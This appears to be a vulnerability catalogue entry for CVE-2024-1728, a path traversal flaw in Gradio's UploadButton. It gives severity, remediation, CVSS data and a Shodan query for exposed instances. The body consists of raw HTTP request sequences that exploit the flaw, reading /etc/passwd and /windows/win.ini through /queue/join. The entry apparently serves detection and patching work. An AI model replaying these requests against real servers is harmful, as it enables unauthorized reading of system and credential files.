---
layout: post
cve_id: CVE-2024-1728
title: Gradio > 4.19.1 UploadButton - Path Traversal
pcap: true
pcap_path: /pcaps/2024/CVE-2024-1728.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-1728.yaml
snort2_rule: N/A
snort3_rule: N/A
author: isacaya
severity: high
impact: 'Attackers can exploit this vulnerability to read arbitrary files on the filesystem,
  such as private SSH keys, by manipulating the file path in the request to the `/queue/join`
  endpoint. This issue could potentially lead to remote code execution. The vulnerability
  is present in the handling of file upload paths, allowing attackers to redirect
  file uploads to unintended locations on the server.

  '
remediation: 'Update to version 4.19.2.

  '
reference:
- https://github.com/gradio-app/gradio/commit/16fbe9cd0cffa9f2a824a0165beb43446114eec7
- https://huntr.com/bounties/9bb33b71-7995-425d-91cc-2c2a2f2a068a
- https://nvd.nist.gov/vuln/detail/CVE-2024-1728
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2024-1728
  cwe-id: CWE-22
  epss-score: 0.81897
  epss-percentile: 0.99164
metadata:
  max-request: 5
  verified: true
  vendor: gradio
  product: gradio
  shodan-query: html:"__gradio_mode__"
tags:
- cve
- cve2024
- lfi
- gradio
- intrusive
- vuln
---

## üîç Vulnerability Description
gradio-app/gradio is vulnerable to a local file inclusion vulnerability due to improper validation of user-supplied input in the UploadButton component.


## üåê HTTP Request
```nohighlight
POST /queue/join HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Connection: close
Content-Length: 232
Content-Type: application/json
Accept-Encoding: gzip
{"data":[{"path":"/etc/passwd","url":"http://www.victim.com/file=/help","orig_name":"CHANGELOG.md","size":3549,"mime_type":"text/markdown"}],"event_data":null,"fn_index":0,"trigger_id":2,"session_hash":"38BJEoFGnvQJuv2eajf4Cm98s8n"}
```

```nohighlight
GET /queue/data?session_hash=38BJEoFGnvQJuv2eajf4Cm98s8n HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /file=LlVYHT HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.7.20) Gecko/ Firefox/3.6.20
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /queue/join HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15
Connection: close
Content-Length: 237
Content-Type: application/json
Accept-Encoding: gzip
{"data":[{"path":"/windows/win.ini","url":"http://www.victim.com/file=/help","orig_name":"CHANGELOG.md","size":3549,"mime_type":"text/markdown"}],"event_data":null,"fn_index":0,"trigger_id":2,"session_hash":"38BJEoFGnvQJuv2eajf4Cm98s8n"}
```

```nohighlight
GET /queue/data?session_hash=38BJEoFGnvQJuv2eajf4Cm98s8n HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.13 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /file=LlVYHT HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.9 Mobile/15E148 Safari/604.1
Connection: close
Accept-Encoding: gzip
```

